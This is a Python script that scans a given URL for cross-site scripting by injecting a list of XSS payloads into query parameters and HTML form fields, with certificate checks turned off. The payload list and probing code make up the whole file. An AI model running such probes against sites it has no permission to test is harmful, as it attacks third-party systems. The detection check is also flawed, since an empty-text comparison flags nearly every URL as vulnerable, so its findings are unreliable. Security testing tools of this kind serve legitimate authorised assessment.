import os
import sys
import time
import requests
import urllib3
from urllib.parse import quote, urlparse, parse_qs, urlencode, urlunparse, urljoin
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

# Common XSS payloads and bypasses (old and new)
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "';alert(1);//",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "<math><mi//xlink:href='data:x,<script>alert(1)</script>'></math>",
    "<details open ontoggle=alert(1)>",
    "<a href='javascript:alert(1)'>X</a>",
    "<input autofocus onfocus=alert(1)>",
    "<object data='javascript:alert(1)'>",
    "<embed src='data:text/html,<script>alert(1)</script>'>",
    "<img src='x' onerror='alert(1)'/>",
    "<svg><script>alert(1)</script>",
    # Encoded payloads
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    # DOM-based XSS
    "javascript:alert(1)",
    "#<script>alert(1)</script>",
]

def print_help():
    help_text = """
Usage: python test.py <url>

This script scans the given URL for possible XSS (Cross-Site Scripting) vulnerabilities.
It tests both URL parameters and HTML forms for common XSS payloads.

Arguments:
  <url>    The target URL to scan for XSS vulnerabilities.

Example:
  python test.py "http://example.com/page?param=value"
"""
    print(help_text)

def save_links_to_file(urls, filename="links.txt"):
    """Save a list of URLs to a text file."""
    with open(filename, "w", encoding="utf-8") as f:
        for url in urls:
            f.write(url + "\n")

def inject_payloads(url, params):
    """Generate URLs with XSS payloads injected into each parameter."""
    urls = []
    for key in params:
        for payload in XSS_PAYLOADS:
            test_params = params.copy()
            test_params[key] = payload
            url_parts = list(urlparse(url))
            url_parts[4] = urlencode(test_params)
            urls.append(urlunparse(url_parts))
    return urls

def find_xss(url):
    """Test a URL for XSS vulnerabilities."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params = {k: v[0] for k, v in params.items()}
    test_urls = inject_payloads(url, params)
    vulnerable = []
    for test_url in test_urls:
        try:
            resp = requests.get(test_url, timeout=5, verify=False)
            for payload in XSS_PAYLOADS:
                if (
                    payload in resp.text or
                    quote(payload) in resp.text or
                    BeautifulSoup(payload, "html.parser").text in resp.text
                ):
                    vulnerable.append((test_url, payload))
        except Exception:
            continue
    return vulnerable

def scan_forms(url):
    """Scan forms for XSS by submitting payloads."""
    resp = requests.get(url, timeout=5, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    forms = soup.find_all("form")
    found = []
    for form in forms:
        action = form.get("action")
        if not action or action.strip() == "":
            action_url = url
        else:
            action_url = urljoin(url, action)
        method = form.get("method", "get").lower()
        inputs = form.find_all("input")
        data = {}
        for inp in inputs:
            name = inp.get("name")
            if name:
                data[name] = XSS_PAYLOADS[0]
        if not data:
            continue  # Skip forms with no named inputs
        try:
            if method == "post":
                r = requests.post(action_url, data=data, timeout=5, verify=False)
            else:
                r = requests.get(action_url, params=data, timeout=5, verify=False)
            payload = XSS_PAYLOADS[0]
            if (
                payload in r.text or
                quote(payload) in r.text or
                BeautifulSoup(payload, "html.parser").text in r.text
            ):
                found.append((action_url, data))
        except Exception:
            continue
    return found

def take_screenshot(url, filename):
    """Take a screenshot of the given URL and save it to the 'screenshoot' folder."""
    folder = "screenshoot"
    os.makedirs(folder, exist_ok=True)
    filepath = os.path.join(folder, filename)
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1200,800")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_experimental_option("prefs", {"profile.default_content_setting_values.notifications": 2})

    driver = webdriver.Chrome(options=chrome_options)
    try:
        driver.get(url)
        time.sleep(2)
        try:
            alert = driver.switch_to.alert
            alert.accept()
            time.sleep(1)
        except Exception:
            pass
        driver.save_screenshot(filepath)
    finally:
        driver.quit()
    return filepath

if __name__ == "__main__":
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    if len(sys.argv) != 2:
        print("Usage: python test.py <url>")
        sys.exit(1)
    url = sys.argv[1]
    print("[*] Testing URL parameters for XSS...")
    vulns = find_xss(url)
    for v in vulns:
        print(f"[!] Vulnerable: {v[0]} with payload: {v[1]}")
    print("[*] Testing forms for XSS...")
    form_vulns = scan_forms(url)
    for v in form_vulns:
        print(f"[!] Vulnerable form: {v[0]} with data: {v[1]}")
    if not vulns and not form_vulns:
        print("[+] No XSS found with tested payloads.")
